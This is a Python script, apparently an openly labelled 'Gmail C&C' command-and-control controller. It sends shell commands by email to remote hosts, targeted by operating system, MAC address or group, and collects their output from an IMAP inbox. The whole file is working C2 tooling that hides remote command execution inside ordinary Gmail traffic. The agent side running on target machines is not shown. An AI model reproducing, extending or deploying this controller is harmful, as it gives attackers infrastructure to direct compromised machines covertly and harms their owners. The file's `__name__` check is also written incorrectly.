import smtplib
import imaplib
import argparse
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import random
import re

def show_banner():
    print(r"""
  ____                 _ _    ____ ___    ____  
 / ___|_ __ ___   __ _(_) |  / ___( _ )  / ___| 
| |  _| '_ ` _ \ / _` | | | | |   / _ \/\ |     
| |_| | | | | | | (_| | | | | |__| (_>  < |___  
 \____|_| |_| |_|\__,_|_|_|  \____\___/\/\____|

=============================================
             Author: Giuseppe Longobardi
             Website: www.phoenixnetacad.com
    """)


# Inserisci qui le informazioni necessarie
source_email = ''  # Email sorgente
destination_email = ''  # Email destinatario
app_password = ''  # App Password generata da Gmail
address_filter = ""
Subject = '' 

# Inizializza la connessione SMTP
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# Autenticazione
server.login(source_email, app_password)
i = 0

def get_parameter_id(input_string, position):
    # Divide la stringa in ingresso in una lista, utilizzando '_' come separatore
    words = input_string.split("_")
    
    # Controlla se la posizione richiesta è valida
    if position <= 0 or position > len(words):
        return "Posizione non valida."
    
    # Restituisce la parola alla posizione specificata, ricordando che l'indicizzazione delle liste in Python inizia da 0
    return words[position - 1]

def send_message(source_email,destination_email,Subject,testo_messaggio,id_command,os_target,communication_type,remote_mac_address,host_group):
    messaggio = MIMEMultipart()
    messaggio['From'] = source_email
    messaggio['To'] = destination_email
    
    if communication_type == "broadcast":
        messaggio['Subject'] = Subject + '_' + str(id_command) + '_' + str(os_target) + '_' + str(communication_type) + '_' + '0'
    
    if communication_type == "multicast":
        messaggio['Subject'] = Subject + '_' + str(id_command) + '_' + str(os_target) + '_' + str(communication_type) + '_' + str(host_group)

    if communication_type == "unicast":
        messaggio['Subject'] = Subject + '_' + str(id_command) + '_' + str(os_target) + '_' + str(communication_type) + '_' + str(remote_mac_address)

    messaggio.attach(MIMEText(testo_messaggio, 'plain'))

    # Invio del messaggio
    try:
        server.sendmail(source_email, destination_email, messaggio.as_string())
        return True
    except:
        return False

def email_update(id_command):
    mail = imaplib.IMAP4_SSL("imap.gmail.com")

    # Autenticazione
    mail.login(source_email, app_password)

    # Seleziona la casella di posta
    mail.select("inbox")
    status, messages = mail.search(None, 'UNSEEN')
    if status != "OK":
        print("Research Error.")
        return

    # Ottieni la lista degli id dei messaggi
    message_ids = messages[0].split()

    for email_id in message_ids:
        # Fetch del messaggio per ID
        status, message_data = mail.fetch(email_id, "(RFC822)")
        if status != "OK":
            print("Mail fetching Error.")
            return

        # Estrai il corpo del messaggio
        raw_email = message_data[0][1]
        msg = email.message_from_bytes(raw_email)
        subject_email = msg["Subject"]
        # Verifica l'indirizzo email del mittente
        from_address = msg["From"]
        if address_filter not in from_address:
            return

        # Estrai e stampa il corpo del messaggio
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    try:
                        body = part.get_payload(decode=True)
                        print("Output Command n°",id_command," from: ",get_parameter_id(subject_email,4),"(",str(get_parameter_id(subject_email,3)),")","\n\n",body.decode("utf-8"))
                    except:
                        print("Output Visualization Error")
        else:
            body = msg.get_payload(decode=True)
            print("Output Command n°",id_command," from: ",get_parameter_id(subject_email,4),"(",str(get_parameter_id(subject_email,3)),")","\n\n",body.decode("utf-8"))

def is_valid_mac_address(mac_address):
    format = 0
    # Regex per il formato con i due punti
    regex_colon = re.compile(r'^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$')
    
    # Regex per il formato con i trattini
    regex_dash = re.compile(r'^([0-9A-Fa-f]{2}[-]){5}([0-9A-Fa-f]{2})$')

    if bool(regex_colon.match(mac_address)):
        format = 1

    if bool(regex_dash.match(mac_address)):
        format = 2

    return format

def convert_mac_format(mac_address_with_dash):
    # Sostituisci ogni trattino '-' con due punti ':'
    mac_address_with_colon = mac_address_with_dash.replace('-', ':')
    
    return mac_address_with_colon
    
def parameters_validation(command,os_target,communication_type,remote_mac_address: str,host_group):
    command = command.lower()
    if os_target != None:
        os_target = os_target.lower()

    if communication_type != None:
        communication_type = communication_type.lower()

    mac_validity = True
    
    if remote_mac_address != None:
        remote_mac_address = remote_mac_address.lower()
        mac_validity = is_valid_mac_address(remote_mac_address)
        if mac_validity == 2:
            remote_mac_address = convert_mac_format(remote_mac_address)

    if host_group != None:
        host_group = host_group.lower()
    
    if command != "update":
        if communication_type == "unicast" and remote_mac_address == None:
            return "Mac Address (-m or --mac) is required in case of UNICAST communication type"
        if communication_type == "multicast" and host_group == None:
            return "Host Group (-g or --group) is required in case of MULTICAST communication type"
        if os_target != "windows" and os_target != "linux":
            return "The OS Can only be linux or windows"
        if mac_validity == 0:
            return "The Mac Address you entered does not have a valid syntax ( The format can be 00:B0:D0:63:C2:26 or 00-B0-D0-63-C2-26)"
    
    return "pass"

def get_command_id():
    current_time_seconds = time.time()
    current_time_milliseconds = int(round(current_time_seconds * 1000))
    return current_time_milliseconds

def main():
    show_banner()
    parser = argparse.ArgumentParser(description='Remote Shell')
    parser.add_argument('-c', '--command', required=True, help='Command (The command to execute or type "update" to get command output from hosts)')
    parser.add_argument('-o', '--os', required=False, help='Operative System (linux/windows)')
    parser.add_argument('-t', '--type', required=False, help='type of communication (unicast/multicast/broadcast) ')
    parser.add_argument('-m', '--mac', required=False, help='remote host mac address (Required only in case of Unicast) ')
    parser.add_argument('-g', '--group', required=False, help='Group (Required only in case of Multicast) ')

    args = parser.parse_args()
    i = 0
    command = args.command
    os_target = args.os
    communication_type = args.type
    remote_mac_address = args.mac
    host_group = args.group
    testo_messaggio = command
    id_command = get_command_id()
    validity = parameters_validation(command,os_target,communication_type,remote_mac_address,host_group)
    if validity != "pass":
        print(validity)
    else:
        if testo_messaggio.lower() == 'update':
            email_update(id_command-1)
        else:
            flag = send_message(source_email,destination_email,Subject,testo_messaggio,id_command,os_target,communication_type,remote_mac_address,host_group)
            if (flag):
                print("Command n°",id_command," Sent.")
                i = i + 1
            else:
                print("Command n°",id_command," Not sent.")
        # Chiusura della connessione
        server.quit()

if __name__ == main:
    main()
else:
    main()
